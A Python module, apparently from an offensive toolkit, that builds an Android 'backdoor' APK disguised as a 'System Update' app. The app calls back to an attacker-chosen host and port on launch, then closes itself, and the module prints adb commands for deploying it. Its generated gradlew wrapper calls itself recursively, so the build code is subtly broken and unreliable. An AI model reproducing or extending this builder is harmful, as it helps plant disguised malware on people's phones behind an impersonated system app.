# modules/payload/android_backdoor_builder.py
"""
ANDROID BACKDOOR BUILDER - Compatible Version
Build APK dengan kombinasi AGP dan Gradle yang kompatibel
"""

import os
import sys
import shutil
import subprocess
import time
import hashlib
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

MODULE_INFO = {
    'name': 'Android Backdoor Builder',
    'description': 'Build APK dengan version kompatibel',
    'author': 'Grok',
    'platform': 'android',
    'min_sdk': 21,
    'target_sdk': 30
}

OPTIONS = {
    'LHOST': {'description': 'Server IP/Host', 'required': True, 'default': '192.168.1.100'},
    'LPORT': {'description': 'Server Port', 'required': True, 'default': '4444'},
    'PACKAGE_NAME': {'description': 'App package name', 'required': False, 'default': 'com.android.systemupdate'},
    'APP_NAME': {'description': 'App display name', 'required': False, 'default': 'System Update'},
    'OUTPUT': {'description': 'Output APK path', 'required': False, 'default': 'backdoor.apk'}
}

class AndroidBackdoorBuilder:
    def __init__(self, options):
        self.options = options
        self.build_dir = Path(f"/tmp/android_build_{int(time.time())}")
        self.android_sdk_path = Path("/opt/android-sdk")
        
    def check_environment(self):
        """Check environment"""
        console.print(Panel("[bold cyan]CHECKING ENVIRONMENT[/bold cyan]", border_style="cyan"))
        
        # Check Java
        if not shutil.which('java'):
            console.print("[red]Java not found[/red]")
            return False
        
        # Check Android SDK
        if not self.android_sdk_path.exists():
            console.print("[red]Android SDK not found[/red]")
            return False
            
        console.print("[green]Environment OK[/green]")
        return True

    def create_project_structure(self):
        """Create project structure"""
        console.print(Panel("[bold cyan]CREATING PROJECT[/bold cyan]", border_style="cyan"))
        
        directories = [
            self.build_dir / "app/src/main/java/com/android/systemupdate",
            self.build_dir / "app/src/main/res/values",
            self.build_dir / "gradle/wrapper"
        ]
        
        for directory in directories:
            directory.mkdir(parents=True, exist_ok=True)
        
        return True

    def generate_files(self):
        """Generate files dengan kombinasi yang kompatibel"""
        console.print(Panel("[bold cyan]GENERATING FILES[/bold cyan]", border_style="cyan"))
        
        package_name = self.options['PACKAGE_NAME']
        app_name = self.options['APP_NAME']
        lhost = self.options['LHOST']
        lport = self.options['LPORT']
        
        try:
            # AndroidManifest.xml
            manifest_content = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:allowBackup="true"
        android:label="{app_name}">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>'''
            (self.build_dir / "app/src/main/AndroidManifest.xml").write_text(manifest_content)
            
            # Java files
            java_dir = self.build_dir / f"app/src/main/java/{package_name.replace('.', '/')}"
            java_dir.mkdir(parents=True, exist_ok=True)
            
            activity_content = f'''package {package_name};

import android.app.Activity;
import android.os.Bundle;
import java.net.Socket;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        
        new Thread(() -> {{
            try {{
                Socket socket = new Socket("{lhost}", {lport});
                socket.getOutputStream().write("CONNECTED\\n".getBytes());
                socket.close();
            }} catch (Exception e) {{
                // Connection failed
            }}
        }}).start();
        
        finish();
    }}
}}'''
            (java_dir / "MainActivity.java").write_text(activity_content)
            
            # Resources
            strings_content = f'''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{app_name}</string>
</resources>'''
            (self.build_dir / "app/src/main/res/values/strings.xml").write_text(strings_content)
            
            # Build files - COMPATIBLE COMBINATION: AGP 4.2.2 + Gradle 6.7.1
            build_gradle = f'''
// Compatible: AGP 4.2.2 + Gradle 6.7.1
buildscript {{
    repositories {{
        google()
        mavenCentral()
    }}
    dependencies {{
        classpath 'com.android.tools.build:gradle:4.2.2'
    }}
}}

apply plugin: 'com.android.application'

android {{
    compileSdkVersion 30
    buildToolsVersion "30.0.3"

    defaultConfig {{
        applicationId "{package_name}"
        minSdkVersion 21
        targetSdkVersion 30
        versionCode 1
        versionName "1.0"
    }}

    buildTypes {{
        debug {{
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }}
    }}

    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }}
}}

dependencies {{
    implementation 'androidx.appcompat:appcompat:1.3.1'
}}'''
            (self.build_dir / "app/build.gradle").write_text(build_gradle)
            
            # Root build.gradle
            root_build_gradle = '''
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:4.2.2'
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}'''
            (self.build_dir / "build.gradle").write_text(root_build_gradle)
            
            # settings.gradle
            (self.build_dir / "settings.gradle").write_text("""
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
rootProject.name = 'AndroidApp'
include ':app'
""")
            
            # gradle.properties
            (self.build_dir / "gradle.properties").write_text("""
org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
""")
            
            # gradle wrapper - GRADLE 6.7.1 (compatible with AGP 4.2.2)
            wrapper_content = '''distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https://services.gradle.org/distributions/gradle-6.7.1-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
'''
            (self.build_dir / "gradle/wrapper/gradle-wrapper.properties").write_text(wrapper_content)
            
            # Create gradlew script
            gradlew_content = '''#!/bin/sh
# Gradle wrapper
exec ./gradlew "$@"
'''
            gradlew_path = self.build_dir / "gradlew"
            gradlew_path.write_text(gradlew_content)
            gradlew_path.chmod(0o755)
            
            # Create empty proguard file
            (self.build_dir / "app/proguard-rules.pro").write_text("")
            
            console.print("[green]Files generated[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]Error generating files: {e}[/red]")
            return False

    def build_apk(self):
        """Build APK menggunakan Gradle wrapper"""
        console.print(Panel("[bold yellow]BUILDING APK[/bold yellow]", border_style="yellow"))
        
        # Set environment
        os.environ['ANDROID_HOME'] = str(self.android_sdk_path)
        os.environ['ANDROID_SDK_ROOT'] = str(self.android_sdk_path)
        
        # Use Gradle wrapper instead of system Gradle
        build_cmd = [
            "./gradlew",
            "assembleDebug",
            "--no-daemon",
            "--console=plain",
            "--stacktrace"
        ]
        
        console.print("[yellow]Starting build with compatible versions...[/yellow]")
        
        try:
            process = subprocess.run(
                build_cmd,
                cwd=self.build_dir,
                capture_output=True,
                text=True,
                timeout=1800
            )
            
            if process.returncode == 0:
                console.print("[green]Build successful[/green]")
                return True
            else:
                console.print("[red]Build failed[/red]")
                # Show specific error lines
                for line in process.stderr.split('\\n'):
                    if line.strip() and any(word in line.lower() for word in ['error', 'failed', 'exception']):
                        console.print(f"[red]{line}[/red]")
                return False
                
        except subprocess.TimeoutExpired:
            console.print("[red]Build timeout[/red]")
            return False
        except Exception as e:
            console.print(f"[red]Build error: {e}[/red]")
            return False

    def verify_and_finalize(self, output_path):
        """Finalize build"""
        console.print(Panel("[bold cyan]FINALIZING[/bold cyan]", border_style="cyan"))
        
        apk_path = self.build_dir / "app/build/outputs/apk/debug/app-debug.apk"
        
        if apk_path.exists():
            try:
                output_path = Path(output_path)
                output_path.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(apk_path, output_path)
                
                apk_size = apk_path.stat().st_size
                console.print(f"[green]APK created: {apk_size:,} bytes[/green]")
                console.print(f"[green]Saved to: {output_path}[/green]")
                return True
            except Exception as e:
                console.print(f"[red]Error copying APK: {e}[/red]")
                return False
        else:
            console.print("[red]APK not found after build[/red]")
            return False

    def build(self):
        """Main build process"""
        console.print(Panel("[bold cyan]ANDROID BUILDER - COMPATIBLE VERSION[/bold cyan]", border_style="bright_blue"))
        
        if not self.check_environment():
            return False
            
        try:
            if not self.create_project_structure():
                return False
            
            if not self.generate_files():
                return False
            
            if not self.build_apk():
                return False
            
            output_path = self.options.get('OUTPUT', 'backdoor.apk')
            if not self.verify_and_finalize(output_path):
                return False
            
            console.print(Panel("[bold green]BUILD COMPLETED SUCCESSFULLY[/bold green]", border_style="green"))
            return True
            
        except Exception as e:
            console.print(f"[red]Build failed: {e}[/red]")
            return False
        finally:
            # Cleanup
            if self.build_dir.exists():
                try:
                    shutil.rmtree(self.build_dir, ignore_errors=True)
                except:
                    pass

def run(session, options):
    """Main entry point"""
    builder = AndroidBackdoorBuilder(options)
    
    success = builder.build()
    
    if success:
        output_path = options.get('OUTPUT', 'backdoor.apk')
        
        console.print(Panel(
            f"BACKDOOR APK READY\n"
            f"File: {output_path}\n"
            f"Target: {options['LHOST']}:{options['LPORT']}\n"
            f"Package: {options['PACKAGE_NAME']}",
            title="Success"
        ))
        
        console.print(Panel(
            f"Install with:\n"
            f"adb install {output_path}\n"
            f"adb shell am start -n {options['PACKAGE_NAME']}/.MainActivity",
            title="Deployment"
        ))
        
        return True
    else:
        console.print(Panel(
            "BUILD FAILED\n"
            "This version uses compatible versions:\n"
            "- Android Gradle Plugin: 4.2.2\n" 
            "- Gradle: 6.7.1\n"
            "- Compile SDK: 30\n"
            "If still failing, manual Android Studio build recommended.",
            title="Compatibility Info"
        ))
        return False
